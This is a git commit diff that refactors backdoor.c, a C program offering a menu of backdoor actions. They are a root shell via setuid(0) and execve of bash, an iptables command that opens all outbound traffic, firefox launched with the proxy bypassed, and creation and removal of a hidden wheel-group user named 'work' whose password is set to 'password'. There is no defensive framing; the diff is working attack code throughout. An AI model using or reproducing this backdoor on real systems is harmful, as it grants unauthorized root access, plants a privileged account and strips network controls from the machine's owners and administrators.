b9444ee7af11d3ad0410c7d9907a6f5c184a1934
ghh-jb <138157456+ghh-jb@users.noreply.github.com>
2026-02-10 13:20:52 +0300

    Lots of refactoring

--- backdoor.c
+++ backdoor.c
@@ -26,6 +26,64 @@ void show_usage() {
 	return;
 }
 
+int give_me_uid(uid_t uid) {
+	int ret = setuid(uid);
+	if (ret == 0) {
+		if (uid == 0) {
+			printf("[+] We are root!\n");
+			return 0;
+		}
+		printf_success("[+] We are uid: %i\n", uid);
+	} else {
+		printf("[-] FAIL: Something went wrong, setuid returned: %i\n", ret);
+		exit(-1);
+	}
+}
+
+void shellcode(void) {
+	// Noreturn?
+	give_me_uid(0);
+	execve("/bin/bash", NULL, NULL);
+}
+int allow_send(void) {
+	give_me_uid(0);
+	system("/usr/sbin/iptables -P OUTPUT ACCEPT");
+	system("systemctl restart iptables.service");
+	printf_success("[+] Send operation: allowed\n");
+	return 0;
+}
+
+void kickstart_firefox(void) {
+	system("http_proxy= https_proxy= ftp_proxy= setsid firefox");
+	printf_success("[+] firefox starting...\n");
+	exit(0);
+}
+
+int add_wheel_user(void) {
+	give_me_uid(0);
+	system("/usr/sbin/useradd -N -M work");
+	system("/usr/sbin/usermod -aG wheel work");
+	printf("[*] System user {work} created");
+	printf("[*] Setting password: {password}\n");
+	system("echo 'work:password' | /usr/sbin/chpasswd");
+	printf_success("[+] {work} user password: {password}\n");
+	printf_success("[+] Try to enter via tty3\n");
+	// DONE: Add automatic password setting
+	return 0;
+}
+
+int delete_wheel_user(void) {
+	give_me_uid(0);
+	system("/usr/sbin/userdel work");
+	printf("[*] Deleted system user: {work}\n");
+
+	system("rm -rf /var/spool/mail/work");
+	printf("[*] Removed mail\n");
+	// system("rm -rf /home/work"); // I do not create home directory by default
+	printf_success("[+] Done!");
+	return 0;
+}
+
 int main(int argc, char const *argv[])
 {
 	show_usage();
@@ -36,48 +94,22 @@ int main(int argc, char const *argv[])
 		return -1;
 	}
 	else if (ch == 1) {
-		int ret = setuid(0);
-		printf("ret: %i\n", ret);
-		execve("/bin/bash", NULL, NULL);
+		shellcode();
 	}
 	else if (ch == 2) {
-		int ret = setuid(0);
-		printf("ret: %i\n", ret);
-		system("/usr/sbin/iptables -P OUTPUT ACCEPT");
-		system("systemctl restart iptables.service");
-		printf_success("send operation: allowed\n");
-		return 0;
+		return allow_send();
 	}
 	else if (ch == 3) {
-		system("http_proxy= https_proxy= ftp_proxy= setsid firefox");
-		printf("firefox shoud be starting, exiting\n");
-		exit(0);
+		kickstart_firefox();
 	}
 	else if (ch == 4) {
-		int ret = setuid(0);
-		printf("ret: %i\n", ret);
-		system("/usr/sbin/useradd -N -M work");
-		system("/usr/sbin/usermod -aG wheel work");
-		printf("system user {work} created");
-		printf("Setting password: {password}\n");
-		system("echo 'work:password' | /usr/sbin/chpasswd");
-		printf("{work} user password: {password}\n");
-		printf("try to enter via tty3\n");
-		// DONE: Add automatic password setting
-		return 0;
+		return add_wheel_user();
 	}
 	else if (ch == 5) {
-		int ret = setuid(0);
-		printf("ret: %i\n", ret);
-		system("/usr/sbin/userdel work");
-		system("rm -rf /var/spool/mail/work");
-		// system("rm -rf /home/work"); // I do not create home directory by default
-		printf("deleted system user: {work}; removed mail\n");
-		return 0;
+		return delete_wheel_user();
 	}
 	else {
-		printf("error\n");
+		printf("[-] FAIL: unk_error\n");
 		return -1;
 	}
-	return 0;
 }
